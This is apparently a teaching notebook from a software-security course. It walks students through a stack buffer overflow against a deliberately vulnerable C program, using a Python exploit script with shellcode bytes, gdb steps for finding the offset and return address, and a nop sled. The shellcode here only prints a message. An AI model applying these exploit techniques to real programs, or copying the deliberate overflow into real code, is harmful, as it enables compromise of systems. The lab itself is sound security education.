{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exploiting Software\n",
    "\n",
    "Last week, we saw how to hijack control flow and redirect it to our chosen destination. This week, we will see how to take control of a system.\n",
    "\n",
    "Let's begin with a vulnerable C program. The following code is in \"exploitme.c\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "int foo(){\n",
    "    char buff[256];\n",
    "    printf(\"Please type a friendly message: \\n\");\n",
    "    fgets(buff,512,stdin);\n",
    "    return 0;\n",
    "}\n",
    "\n",
    "int main(){\n",
    "        foo();\n",
    "        return 0;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Shellcode\n",
    "\n",
    "Compile \"exploitme.c\" with the \"make\" command. As you've already learned, we can crash this program by simply filling buff with enough 'A's. You also know that we could rewrite the return address on the stack by overflowing the buffer. This is how we hijack control flow. We have the ability to direct execution anywhere we like. We don't have any code we'd like to execute yet. All dressed up with nowhere to go. How do we get our code into the program?\n",
    "\n",
    "We're already taking advantage of the user-controlled input to perform the buffer overflow. Why not use it to input our payload as well? The string we input goes into the buffer, and the buffer is on the stack, and the stack is in memory. Therefore, our input string is already somewhere in memory. If our input string contains our payload, we can redirect control flow there and execute our payload.\n",
    "\n",
    "Just input our payload. This is a simple enough idea in principle, but in practice it's quite complicated. Think about what this really means. We need to input a *string* that contains a binary x86 program! This is difficult, but not impossible.\n",
    "\n",
    "The hackers that pioneered this trick used it to inject code to open a shell. Some innocent program would be merrily executing on the machine. The hacker would inject their input, and a shell would pop open. This would give the hacker full access to the CLI. This is what \"popping a shell\" means.\n",
    "\n",
    "This kind of payload is so common that we just started calling **any** string containing machine code payload \"shellcode.\" We refer to it as \"shellcode\" now regardless of what the payload actually does. **shellcode** is the raw bytes of machine code put into a string.\n",
    "\n",
    "Here is some example shellcode:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "shellcode=b\"\\xeb\\x19\\x31\\xc0\\xb0\\x04\\x31\\xdb\\xb3\\x01\\x59\\x31\\xd2\\xb2\\x1f\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xb3\\x01\\xcd\\x80\\xe8\\xe2\\xff\\xff\\xff\\x69\\x6d\\x20\\x69\\x6e\\x20\\x75\\x72\\x20\\x62\\x61\\x73\\x65\\x20\\x6b\\x69\\x6c\\x6c\\x69\\x6e\\x20\\x75\\x72\\x20\\x64\\x30\\x30\\x64\\x7a\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To write shellcode, a hacker has to carefully write their payload in a limited set of assembly code. If you'd like to learn more about it, I posted some links below. Don't worry. I won't make you write shellcode. What does this exploit do? Let's try to run it and find out!\n",
    "\n",
    "We need to put this shellcode into the buffer, hijack control flow, and then direct execution at our buffer."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Hijacking Control Flow\n",
    "\n",
    "We need to hijack control flow again. This means we have two tasks:\n",
    "\n",
    "1) We need to overflow the buffer with enough 'A's to push our new return address value into the right spot to overwrite the old return address.\n",
    "\n",
    "2) We need to find where our shellcode is in memory.\n",
    "\n",
    "Let's start with the first task. We'll build our overflow using \"exploitme.py\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/python\n",
    "\n",
    "from struct import pack\n",
    "\n",
    "overflow=b\"A\"*10             # FIX ME (task 1)\n",
    "new_ra=pack(\"<I\",0xaabbccdd) # FIX ME (task 2)\n",
    "\n",
    "shellcode=b\"\\xeb\\x19\\x31\\xc0\\xb0\\x04\\x31\\xdb\\xb3\\x01\\x59\\x31\\xd2\\xb2\\x1f\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xb3\\x01\\xcd\\x80\\xe8\\xe2\\xff\\xff\\xff\\x69\\x6d\\x20\\x69\\x6e\\x20\\x75\\x72\\x20\\x62\\x61\\x73\\x65\\x20\\x6b\\x69\\x6c\\x6c\\x69\\x6e\\x20\\x75\\x72\\x20\\x64\\x30\\x30\\x64\\x7a\"\n",
    "\n",
    "\n",
    "payload=overflow+new_ra+shellcode\n",
    "\n",
    "print(payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Overwriting the Return Address\n",
    "\n",
    "Run the Python script to generate our input.\n",
    "\n",
    "exploitme.py > input.txt\n",
    "\n",
    "Now, let's run gdb on our victim program.\n",
    "\n",
    "gdb exploitme\n",
    "\n",
    "Disassemble foo and set a breakpoint for its return instruction. Remember, this instruction represents the moment we want to seize control of execution.\n",
    "\n",
    "disas foo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Dump of assembler code for function foo:\n",
    "   0x080488a5 <+0>:     push   ebp\n",
    "   0x080488a6 <+1>:     mov    ebp,esp\n",
    "   0x080488a8 <+3>:     sub    esp,0x108\n",
    "   0x080488ae <+9>:     sub    esp,0xc\n",
    "   0x080488b1 <+12>:    push   0x80ac0a8\n",
    "   0x080488b6 <+17>:    call   0x8050420 <puts>\n",
    "   0x080488bb <+22>:    add    esp,0x10\n",
    "   0x080488be <+25>:    mov    eax,ds:0x80d949c\n",
    "   0x080488c3 <+30>:    sub    esp,0x4\n",
    "   0x080488c6 <+33>:    push   eax\n",
    "   0x080488c7 <+34>:    push   0x200\n",
    "   0x080488cc <+39>:    lea    eax,[ebp-0x108]\n",
    "   0x080488d2 <+45>:    push   eax\n",
    "   0x080488d3 <+46>:    call   0x804ff70 <fgets>\n",
    "   0x080488d8 <+51>:    add    esp,0x10\n",
    "   0x080488db <+54>:    mov    eax,0x0\n",
    "   0x080488e0 <+59>:    leave\n",
    "   0x080488e1 <+60>:    ret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set a breakpoint here.\n",
    "\n",
    "break \\*0x080488e1\n",
    "\n",
    "Now, let's run with our input.\n",
    "\n",
    "run < input.txt\n",
    "\n",
    "Our goal is to make the stack pointer (esp) point to the new return address. In our Python script, I made that an easily recognizable value (\"aabbccdd\"). We need to fill the buffer with **exactly** the right number of 'A's so that this gdb command displays \"aabbccdd\":\n",
    "\n",
    "x/wx $esp \n",
    "\n",
    "**This is your job.** Modify this line of the Python script so we print the right number of letter 'A's. This is *not* a number you should just know or compute. You'll need to iterate and guess and check until you get it right."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "overflow=b\"A\"*10             # FIX ME (task 1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can inspect the memory around the stack pointer with this gdb command:\n",
    "\n",
    "x/16wx $esp-25\n",
    "\n",
    "This will print 16 words 25 bytes before esp. The output looks like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "0xffffd363:     0x41414141      0x41414141      0x41414141      0xaabbccdd\n",
    "0xffffd373:     0xc03119eb      0xdb3104b0      0x315901b3      0xcd1fb2d2\n",
    "0xffffd383:     0xb0c03180      0xb3db3101      0xe880cd01      0xffffffe2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This is output I got when I modified the Python script to print 255 'A's and ran that command. Note that we can see the 'A's overflowing the buffer (hex 0x41414141 is 'AAAAA' in ASCII). Right after all the 'A's, we have 0xddccbbaa. That's the value we want to be at esp, so I need to overflow a bit more.\n",
    "\n",
    "(Side note: you can see our shellcode immediately after 0xddccbbaa. Our payload is in memory!)\n",
    "\n",
    "Keep editing the Python script and running the program in the debugger until you get x/x $esp to display 0xddccbbaa breakpoint.\n",
    "\n",
    "**IMPORTANT REMINDER:** every time you update \"exploitme.py\", you also need to re-run the script with this command:\n",
    "\n",
    "exploitme.py > input.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Redirecting Execution\n",
    "\n",
    "Assuming you've completed task 1, we still need to complete task 2. Now, we're overwriting the return address with 0xaabbccdd. If you run the program in gdb with no breakpoints and give it our input, you should get this error message:\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.  \n",
    "0xaabbccdd in ?? ()\n",
    "\n",
    "We're jumping to memory address 0xaabbccdd, and there aren't any instructions there. 0xaabbccdd was a convenient value for getting the right number of bytes in our overflow, but we need to replace it with the location of our shellcode.\n",
    "\n",
    "Where is our shellcode? If you look at the Python code, you'll see that we put it into the buffer right *after* the new return address (\"new_ra\"). In the previous section, you positioned new_ra so it's on top of the stack at the very end of foo. Our shell code is immediately after that. Which means our shell code is juuuuuuust after the top of the stack. That's a helpful clue for finding it. \n",
    "\n",
    "**This is your job.** You need to find the address of our shell code and put that in place of 0xaabbccdd in this line of our Python script:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_ra=pack(\"<I\",0xaabbccdd) # FIX ME (task 2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Again, you'll need to run the debugger and set a breakpoint for the end of foo.\n",
    "\n",
    "gdb exploitme  \n",
    "break \\*0x080488e1  \n",
    "run < input.txt  \n",
    "\n",
    "You can view the current top of the stack with x/wx $esp, which should print:\n",
    "\n",
    "0xffffd37c:     0xaabbccdd\n",
    "\n",
    "You can also view the contents of a memory address directly with this command:\n",
    "\n",
    "x/wx 0xffffd37c\n",
    "\n",
    "You need to find the address of our shellcode. The contents of that memory address should be 0xc03119eb (the reverse of the start of shellcode=b\"\\xeb\\x19\\x31\\xc0...\").\n",
    "\n",
    "When you find the address, put it into the Python script in place of 0xaabbccdd in the Python script. You should be able to run this series of commands:\n",
    "\n",
    "exploitme.py > input.txt  \n",
    "gdb exploitme \n",
    "run < input.txt \n",
    "\n",
    "If you get this right, our shell code should execute, and you should see a message."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Nop Sled\n",
    "\n",
    "You did it! You made an exploit! Let's test it outside the debugger.\n",
    "\n",
    "./exploitme < input.txt  \n",
    "\n",
    "Oh no! Your exploit broke! What happened? Why won't the exploit work outside the debugger? We want to hack real programs, not programs running in a debugger!\n",
    "\n",
    "Our exploit relies on the address in \"new_ra\" being exactly right. That must be the exact address of the start of our shellcode. If the location of our shellcode were to move by even *one byte*, the entire exploit would break. We'd jump to the wrong instruction or a nonexistent instruction. Eventually, the program would crash.\n",
    "\n",
    "The call stack is positioned slightly differently inside the debugger than it is outside the debugger. Our exploit is too fragile to work inside and outside the debugger.\n",
    "\n",
    "\"nop\" is an x86 instruction that does nothing. We can add a lot of \"nop\"s. A long we land somewhere in those noops, our exploit will run properly.\n",
    "\n",
    "Let's add a nop sled to your exploit. In \"exploitmenop.py\", you'll see code similar to \"exploitme.py\". In \"exploitmenop.py\", update the values for the new_ra address and overflow size you found (tasks 1 and 2.)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/python\n",
    "\n",
    "from struct import pack\n",
    "\n",
    "new_ra=pack(\"<I\",0xaabbccdd) # FIX ME\n",
    "overflow=b\"A\"*10             # FIX ME\n",
    "\n",
    "shellcode=b\"\\xeb\\x19\\x31\\xc0\\xb0\\x04\\x31\\xdb\\xb3\\x01\\x59\\x31\\xd2\\xb2\\x1f\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xb3\\x01\\xcd\\x80\\xe8\\xe2\\xff\\xff\\xff\\x69\\x6d\\x20\\x69\\x6e\\x20\\x75\\x72\\x20\\x62\\x61\\x73\\x65\\x20\\x6b\\x69\\x6c\\x6c\\x69\\x6e\\x20\\x75\\x72\\x20\\x64\\x30\\x30\\x64\\x7a\"\n",
    "\n",
    "nopsled=\"\\x90\"*128\n",
    "\n",
    "payload=overflow+new_ra+nopsled+shellcode\n",
    "\n",
    "print(payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you look at the bottom, you can see I've added 128 nops to the payload. The nops are just before the payload. We want to jump a little more than halfway into that sled. That way, if the stack moves a few bytes in either direction, our exploit will still work. We'll hit the nop sled and slide down to the payload.\n",
    "\n",
    "Add about 80 to the value of new_ra. That should make you jump roughly halfway into the nop sled. Your exploit should now work inside **and** outside the debugger. If it doesn't, add a little bit more to new_ra until it does. Creating exploits is both an art and a science."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercises \n",
    "\n",
    "1) How many 'A's did you need to overflow the buffer? How did you find it?\n",
    "\n",
    "2) Where was our payload on the stack? What value did you put into new_ra to execute the exploit?\n",
    "\n",
    "3) What did the exploit print out?\n",
    "\n",
    "4) Could you get your exploit working without the debugger?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Further Reading\n",
    "\n",
    "If you'd like to learn more about how to make shellcode, the answers to [this](https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world) Stack Overflow question are spectacular. [This](https://www.doyler.net/security-not-included/hello-world-shellcode) detailed blog post is also very well written.\n",
    "\n",
    "There's an entire database of shellcode [here](http://shell-storm.org/shellcode/), if you'd like to see what kind of payloads are possible.\n",
    "\n",
    "If you'd like more on how to write a buffer overflow exploit in detail [this](https://www.youtube.com/watch?v=HSlhY4Uy8SA) YouTube tutorial is also quite nice."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
